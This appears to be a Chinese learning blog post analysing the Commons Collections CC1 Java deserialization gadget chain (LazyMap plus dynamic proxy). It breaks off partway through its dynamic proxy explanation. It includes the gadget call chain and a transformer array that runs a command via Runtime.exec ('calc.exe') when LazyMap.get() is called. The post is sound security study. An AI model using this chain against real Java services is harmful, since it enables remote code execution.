<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CC1-下 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="CC1-下" />
<meta property="og:description" content="目录 1. 前言2. 前置知识2.1 LazyMap2.2 动态代理补充动态代理重点： 3. LazyMap 分析3.1为什么要使用动态代理3.2 漏洞触发点3.3 构造poc 4.从反序列化的角度来看poc4.1跟着debug4.2 利用链分析：4.3 唯一比较绕的点是 5. 版本问题6.参考： 1. 前言 JDK版本需要时 8u71之前，尽管使用了动态代理…
也就是说**LazyMap &#43; 动态代理** == TransformedMap。。。。。
相比较于 TransformedMap 链相比，多出来的就是我们要了解 LazyMap ，还有动态代理。
LazyMap的漏洞触发点和TransformedMap唯一的差别是，TransformedMap 是在写入元素的时候执行transform()，就是在put()数据，写入键值对的时候，会调用它的第二个，第三个参数的 transform() 函数。还有Map.Entry的方法，现在知道，至少setValue()能够了。
The Map put methods and Map.Entry method are affected by this class LazyMap是在其 get方法中执行的 factory.transform()方法。 为什么是这样的呢？
像P神说的： LazyMap 的作用就是懒加载，在 get 找不到值的时候，他就会调用 factory的transform 方法去获取一个值：
public Object get(Object key) { // create value for key if key is not currently in the map if (map." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/5fd9b72d2ec701de2aef89e5733e43a0/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-12-21T09:34:59+08:00" />
<meta property="article:modified_time" content="2021-12-21T09:34:59+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">CC1-下</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>目录</h4> 
 <ul><li><a href="#1__4" rel="nofollow">1. 前言</a></li><li><a href="#2__65" rel="nofollow">2. 前置知识</a></li><li><ul><li><a href="#21_LazyMap_67" rel="nofollow">2.1 LazyMap</a></li><li><a href="#22__174" rel="nofollow">2.2 动态代理</a></li><li><ul><li><ul><li><a href="#_261" rel="nofollow">补充动态代理重点：</a></li></ul> 
   </li></ul> 
  </li></ul> 
  </li><li><a href="#3_LazyMap__305" rel="nofollow">3. LazyMap 分析</a></li><li><ul><li><ul><li><a href="#31_309" rel="nofollow">3.1为什么要使用动态代理</a></li><li><a href="#32__369" rel="nofollow">3.2 漏洞触发点</a></li><li><a href="#33_poc_394" rel="nofollow">3.3 构造poc</a></li></ul> 
  </li></ul> 
  </li><li><a href="#4poc_494" rel="nofollow">4.从反序列化的角度来看poc</a></li><li><ul><li><a href="#41debug_500" rel="nofollow">4.1跟着debug</a></li><li><a href="#42__540" rel="nofollow">4.2 利用链分析：</a></li><li><a href="#43__564" rel="nofollow">4.3 唯一比较绕的点是</a></li></ul> 
  </li><li><a href="#5__590" rel="nofollow">5. 版本问题</a></li><li><a href="#6_596" rel="nofollow">6.参考：</a></li></ul> 
</div> 
<p></p> 
<h2><a id="1__4"></a>1. 前言</h2> 
<p>JDK版本需要时 <code>8u71</code>之前，尽管使用了<strong>动态代理</strong>…</p> 
<p>也就是说**<code>LazyMap</code> + 动态代理** == <strong>TransformedMap</strong>。。。。。</p> 
<p>相比较于 <code>TransformedMap</code> 链相比，多出来的就是我们要了解 <code>LazyMap</code> ，还有<strong>动态代理</strong>。</p> 
<p><code>LazyMap</code>的漏洞触发点和<code>TransformedMap</code>唯一的差别是，<code>TransformedMap</code> 是在写入元素的时候执行<code>transform()</code>，就是在<code>put()</code>数据，写入键值对的时候，会调用它的第二个，第三个参数的 <code>transform()</code> 函数。还有<code>Map.Entry</code>的方法，现在知道，至少<code>setValue()</code>能够了。</p> 
<pre><code class="prism language-java"><span class="token class-name">The</span> <span class="token class-name">Map</span> put methods and <span class="token class-name">Map<span class="token punctuation">.</span>Entry</span>  method are affected by <span class="token keyword">this</span> <span class="token keyword">class</span>
</code></pre> 
<p><code>LazyMap</code>是在其 <code>get</code>方法中执行的 <code>factory.transform()</code>方法。 为什么是这样的呢？</p> 
<p>像P神说的： <code>LazyMap</code> 的作用就是<strong>懒加载</strong>，在 get 找不到值的时候，他就会调用 <code>factory的transform</code> 方法去获取一个值：</p> 
<pre><code class="prism language-java">    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Object</span> key<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// create value for key if key is not currently in the map</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token class-name">Object</span> value <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> value<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> 
<p>但是相比于<code>TransformedMap</code>的利用方法，<code>LazyMap</code>后续利用稍微复杂一些，原因是在<code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的<code>readObject</code>方法中并没有直接调用到<code>Map</code>的<code>get</code>方法。</p> 
<p>那么我们就找一个类，什么类呢？，就是它会在自己<code>readObject()</code> 中调用到 <code>Map.get()</code> 方法，那么这个类就有潜能。</p> 
<p>那么怎么去找呢？就是我们要分析的东西了</p> 
<p>利用链</p> 
<pre><code class="prism language-java"><span class="token class-name">ObjectInputStream</span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token class-name">AnnotationInvocationHandler</span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token class-name">Proxy</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                    <span class="token class-name">AnnotationInvocationHandler</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                        <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                            <span class="token class-name">ChainedTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                <span class="token class-name">ConstantTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                <span class="token class-name">InvokerTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                    <span class="token class-name">Method</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                        <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                <span class="token class-name">InvokerTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                    <span class="token class-name">Method</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                <span class="token class-name">InvokerTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                    <span class="token class-name">Method</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<h2><a id="2__65"></a>2. 前置知识</h2> 
<h3><a id="21_LazyMap_67"></a>2.1 LazyMap</h3> 
<p>看一下类注释。</p> 
<p>翻译：</p> 
<p>装饰另一个<code>Map</code>，来按照需求在map中创建对象；当 <code>{@link #get(Object)}</code> 这个方法被调用，且一个键不在map中，工厂将来创建对象，创建的对象将会作为需求<code>key</code> 的 <code>value</code> ，</p> 
<pre><code class="prism language-java"><span class="token comment">/**
 * Decorates another &lt;code&gt;Map&lt;/code&gt; to create objects in the map on demand.
 * &lt;p&gt;
 * When the {@link #get(Object)} method is called with a key that does not
 * exist in the map, the factory is used to create the object. The created
 * object will be added to the map using the requested key.
 * &lt;p&gt;
 * For instance:
 * &lt;pre&gt;
 * Factory factory = new Factory() {
 *     public Object create() {
 *         return new Date();
 *     }
 * }
 * Map lazy = Lazy.map(new HashMap(), factory);
 * Object obj = lazy.get("NOW");
 * &lt;/pre&gt;
 *
 * After the above code is executed, &lt;code&gt;obj&lt;/code&gt; will contain
 * a new &lt;code&gt;Date&lt;/code&gt; instance. Furthermore, that &lt;code&gt;Date&lt;/code&gt;
 * instance is mapped to the "NOW" key in the map.
 * &lt;p&gt;
 * This class is Serializable from Commons Collections 3.1.
 *
 * @since Commons Collections 3.0
 * @version $Revision: 1.7 $ $Date: 2004/05/07 23:30:33 $
 * 
 * @author Stephen Colebourne
 * @author Paul Jack
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LazyMappublic</span> <span class="token keyword">class</span> <span class="token class-name">LazyMap</span>
        <span class="token keyword">extends</span> <span class="token class-name">AbstractMapDecorator</span>
        <span class="token keyword">implements</span> <span class="token class-name">Map</span><span class="token punctuation">,</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{<!-- --></span>

</code></pre> 
<p>构造方法：</p> 
<pre><code class="prism language-java">    <span class="token comment">/**
     * Factory method to create a lazily instantiated map.
     * 
     * @param map  the map to decorate, must not be null
     * @param factory  the factory to use, must not be null
     * @throws IllegalArgumentException if map or factory is null
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Map</span> <span class="token function">decorate</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Transformer</span> factory<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">LazyMap</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> factory<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> 
<p>当这个<code>Map</code>调用<code>get()</code>方法，而查找的<code>key</code>又不存在的情况下，这个工厂就会被用来创建新的对象，而且将被添加到这个map中。</p> 
<p>和<code>TransformedMap</code>的用法也差不多，都是用来修饰一个<code>Map</code>的，看个例子就懂了</p> 
<pre><code class="prism language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token string">"adam"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span> outerMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> 
<p><code>outerMap.get("1")</code> 返回的就是 <code>ConstantTransformer("adam")</code> 的那个<code>transform()</code> 方法返回的值，然后这是固定的，就是<strong>adam</strong> 了。</p> 
<p>写一个命令执行： 触发的时候在 <code>get()</code> ，get什么内容随意的，上面懂了的化，自然懂。</p> 
<pre><code class="prism language-java">        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
                <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span> <span class="token string">"getRuntime"</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
                <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token string">"calc.exe"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span>transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span> outerMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"adam"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h3><a id="22__174"></a>2.2 动态代理</h3> 
<p>之前学过了。我学了个shi，还是不会，</p> 
<p>作为一门静态语言，如果想劫持一个对象内部的方法调用，实现类似PHP的魔术方法 <code>__call</code> ，我们需要用到 <code>java.reflect.Proxy</code></p> 
<pre><code class="prism language-java"><span class="token class-name">Map</span> proxyMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/89/16/Fj2S0x17_o.png" alt="在这里插入图片描述"></p> 
<p><code>Proxy.newProxyInstance</code> 的<strong>第一个参数</strong>是<code>ClassLoader</code>，是要被代理类的<code>ClassLoader</code>。我们用默认的即可；<strong><em>第二个参数<em><strong>是我们</strong>要代理的对象集合</em></em>；<strong>第三个参数</strong>是一个实现了<code>InvocationHandler</code>接口的对象，里面</strong>包含了具体代理的逻辑**。也就是我们具体是如何代理的。</p> 
<p>之类贴一个 y4 师傅的一个<strong>劫持</strong>学习一下，然后把自己不会的也补了补</p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">aa</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationHandler</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> demo1 <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>

        <span class="token comment">/*这个是我们要被代理的实例，传入代理类的构造方法中*/</span>
        flag myflag <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GiveFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvocationFlag</span><span class="token punctuation">(</span>myflag<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 这个差不读是固定的了</span>
        
        <span class="token comment">/*这个就是我们的代理实例了，代理的类型是 flag类型*/</span>
        flag getFlag <span class="token operator">=</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">GiveFlag</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{<!-- --></span>flag<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
        getFlag<span class="token punctuation">.</span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        getFlag<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">interface</span>  flag<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">void</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">GiveFlag</span> <span class="token keyword">implements</span>  flag<span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"your flag flag{afam_s_flag}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"testestset"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">InvocationFlag</span> <span class="token keyword">implements</span> <span class="token class-name">InvocationHandler</span><span class="token punctuation">{<!-- --></span>

    <span class="token keyword">private</span> flag secretflag<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">InvocationFlag</span><span class="token punctuation">(</span>flag myflag<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>secretflag <span class="token operator">=</span> myflag<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span> object<span class="token punctuation">,</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"===================================="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"开始代理了哦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 这个 Object object 用不上的，想要用对象的化，在构造方法中让他传参进来</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"getFlag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hacker!! no flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span>  <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"正常的方法还是帮忙执行的呢"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> ret <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>secretflag<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 知道了这里 invoke  不能使用 上面的Object，要使用 构造函数传进来的实例对象</span>
        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> 
<p><img src="https://images2.imgbox.com/ec/77/dSprurek_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="_261"></a>补充动态代理重点：</h5> 
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>

    flag myflag <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GiveFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/*这个是我们要被代理的实例，传入代理类的构造方法中*/</span>
    <span class="token comment">/* 这里才是决定我们使用哪一个代理类来帮助我们进行代理的，这个 InvovationFlag 是必须有 invoke() 方法，的当然，不是 new 对象也行，Class.newInstance() 这样的形式也行，只要这个类是有 invoke() 方法的就行， */</span>
    <span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvocationFlag</span><span class="token punctuation">(</span>myflag<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 这个差不读是固定的了</span>

    <span class="token comment">/*这个就是我们的代理实例了，代理的类型是 flag类型 ， 我们走的 invoke() 方法就看 第三个参数的 handler 的，而handler是在上面决定的*/</span>
    flag getFlag <span class="token operator">=</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">GiveFlag</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{<!-- --></span>flag<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    getFlag<span class="token punctuation">.</span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    getFlag<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>用我们这个例子来说：</p> 
<p>动态代理：需要<strong>实现类</strong> ，然后需要<strong>代理类</strong> ，代理类是需要我们自己写的，</p> 
